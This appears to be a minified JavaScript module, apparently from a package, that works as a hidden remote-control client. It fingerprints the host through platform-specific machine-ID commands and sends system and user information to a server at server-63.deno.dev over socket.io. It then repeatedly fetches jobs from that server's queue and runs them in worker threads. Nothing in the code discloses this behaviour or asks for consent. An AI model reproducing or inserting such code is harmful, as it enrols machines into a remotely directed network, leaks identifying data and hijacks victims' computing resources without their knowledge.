import*as e from"worker_threads";import r from"path";import{io as t}from"socket.io-client";import s from"axios";import o from"os";import{execSync as n}from"child_process";var{platform:a}=process,i={darwin:"ioreg -rd1 -c IOPlatformExpertDevice",win32:`${{native:"%windir%\\System32",mixed:"%windir%\\sysnative\\cmd.exe /c %windir%\\System32"}[function(){if("win32"!==process.platform)return"";if("ia32"===process.arch&&process.env.hasOwnProperty("PROCESSOR_ARCHITEW6432"))return"mixed";return"native"}()]}\\REG.exe QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid`,linux:"( cat /var/lib/dbus/machine-id /etc/machine-id 2> /dev/null || hostname ) | head -n 1 || :",freebsd:"kenv -q smbios.system.uuid || sysctl -n kern.hostuuid"};var m=r.dirname(new URL(import.meta.url).pathname),c=r.resolve(m,"..","imports");r.resolve(c,"tmp");var p=function(e){switch(a){case"darwin":return e.split("IOPlatformUUID")[1].split("\n")[0].replace(/\=|\s+|\"/gi,"").toLowerCase();case"win32":return e.toString().split("REG_SZ")[1].replace(/\r+|\n+|\s+/gi,"").toLowerCase();case"linux":case"freebsd":return e.toString().replace(/\r+|\n+|\s+/gi,"").toLowerCase();default:throw new Error(`Unsupported platform: ${process.platform}`)}}(n(i[a]).toString()),l=()=>({cpu:o.cpus(),memory:o.totalmem(),platform:o.platform(),release:o.release(),uptime:o.uptime(),hostname:o.hostname(),type:o.type(),arch:o.arch(),userInfo:o.userInfo(),version:o.version(),loadavg:o.loadavg(),freemem:o.freemem()}),d=t("https://server-63.deno.dev",{query:{instance:p}});d.on("connect",(async()=>{await l(),setTimeout((()=>{console.log("Sending system info to server"),d.emit("system",{...l()})}),250)}));var u=r.dirname(new URL(import.meta.url).pathname),f=r.resolve(u,"worker.js"),h=[],v=[],w=(()=>{const e=o.cpus(),r=o.totalmem();return(e.length/1+r/1024/1024/1024/1)/2})();setInterval((async()=>{h.length<10&&(async()=>{const{data:e}=await s.get("https://server-63.deno.dev/queue",{params:{instance:p}});h=h.concat(e)})()}),500),setInterval((()=>{if(h.length>0&&v.length<w){const r=h.shift();v.push(r),(async r=>new Promise((t=>{const s=new e.Worker(f);s.postMessage(r),process.on("exit",(()=>{s.terminate(),t(!0)})),s.on("exit",(()=>{t(!0)})),s.on("error",(()=>{t(!0)}))})))({intent:"start",data:{...r,job:(null==r?void 0:r.job)||"./skip.js"}}).finally((()=>{v=v.filter((e=>e!==r))}))}}),500);
